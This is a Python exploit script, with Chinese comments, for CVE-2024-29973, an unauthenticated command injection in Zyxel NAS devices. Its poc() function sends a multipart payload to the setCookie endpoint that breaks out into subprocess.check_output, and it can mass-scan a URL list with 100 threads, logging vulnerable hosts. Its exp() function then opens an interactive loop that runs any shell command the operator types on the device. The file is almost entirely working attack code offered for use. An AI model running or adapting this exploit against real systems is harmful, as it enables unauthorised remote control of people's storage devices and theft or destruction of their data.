import re,time,sys
import requests
import argparse
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()    # 解除警告
RED = '\033[91m'
RESET = '\033[0m'

headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryHHaZAYecVOf5sfa6"
    }

def banner():
    banner_text = """
                                                   _______  _________  
 ___.__. ____   ____    ____ ___.__. ____  __ __   \      \ \_   ___ \\ 
<   |  |/  _ \\ /    \\  / ___<   |  |/  _ \\|  |  \\  /   |   \\/    \\  \\  
 \\___  (  <_> )   |  \\/ /_/  >___  (  <_> )  |  / /    |    \\     \\____
 / ____|\\____/|___|  /\\___  // ____|\\____/|____/  \\____|__  /\\______  /
 \\/                \\/_____/ \\/                           \\/        \\/ 
                                                     info: Zyxel NAS设备 setCookie 未授权命令注入漏洞复现 (CVE-2024-29973)
                                                     version: nc.1.0    author: YeahSir
"""
    print(banner_text)

def main():
    banner()
    parser = argparse.ArgumentParser(description="Zyxel NAS设备 setCookie 未授权命令注入漏洞复现(CVE-2024-29973) exp")
    parser.add_argument('-u', '--url', dest='url', type=str, help='input your link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='input your file path')

    args = parser.parse_args()

    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for i in f.readlines():
                url_list.append(i.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUsage: python {sys.argv[0]} -h")

def poc(target):
    # headers = {
    #     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
    #     "Accept": "*/*",
    #     "Accept-Language": "en-US,en;q=0.5",
    #     "Accept-Encoding": "gzip, deflate",
    #     "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryHHaZAYecVOf5sfa6"
    # }
    data = (
        "------WebKitFormBoundaryHHaZAYecVOf5sfa6\r\n"
        "Content-Disposition: form-data; name=\"c0\"\r\n\r\n"
        "storage_ext_cgi CGIGetExtStoInfo None) and False or __import__('subprocess').check_output('id', shell=True)#\r\n"
        "------WebKitFormBoundaryHHaZAYecVOf5sfa6--\r\n"
    )
    payload_url = '/cmd,/simZysh/register_main/setCookie'
    url = target + payload_url
    try:
        res = requests.get(url=target, verify=False)
        if res.status_code == 200:
            res2 = requests.post(url=url, data=data, headers=headers, verify=False)
            if res2.status_code == 200:
                match = re.search(r'\bOK\b', res2.text)
                if match:
                    print(f'{RED}[+] 该url {target} 存在未授权命令注入漏洞{RESET}')
                    with open('result.txt', 'a', encoding='utf-8') as fp:
                        fp.write(target + '\n')
                    return True
                else:
                    print(f'[-] 该 {target} 不存在命令执行漏洞')
                    return False
            else:
                print(f'[!] 该 {target} POST 请求失败，状态码: {res2.status_code}')
        else:
            print(f'[!] 该 {target} GET 请求失败，状态码: {res.status_code}')
    except Exception as e:
        print(f'[*] 该站点 {target} 存在问题，请手动测试: {e}')
        return False
    
def exp(target):
    print("----------正在进行漏洞利用----------")
    time.sleep(1)
    while True:
        cmd = input('请输入你要执行的命令(输入q退出)：')
        if cmd == 'q':
            print('正在退出')
            break
        # headers = {
        #     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
        #     "Accept": "*/*",
        #     "Accept-Language": "en-US,en;q=0.5",
        #     "Accept-Encoding": "gzip, deflate",
        #     "Content-Type": "application/x-www-form-urlencoded"
        # }
        try:
            data = (
        "------WebKitFormBoundaryHHaZAYecVOf5sfa6\r\n"
        "Content-Disposition: form-data; name=\"c0\"\r\n\r\n"
        f"storage_ext_cgi CGIGetExtStoInfo None) and False or __import__('subprocess').check_output('{cmd}', shell=True)#\r\n"
        "------WebKitFormBoundaryHHaZAYecVOf5sfa6--\r\n"
    )   
            url = f'{target}/cmd,/simZysh/register_main/setCookie'
            res = requests.post(url=url, headers=headers, data=data)
            
            # 修正正则表达式以确保匹配正确
            match = re.search(r'"zyshdata0": \[(.*?)\]', res.text, re.S)
            if match:
                print(match.group(1).split())
            else:
                print("未找到匹配的结果")
        except Exception as e:
            print(f'[*] 发送命令时出现错误: {e}')
            continue

if __name__ == '__main__':
    main()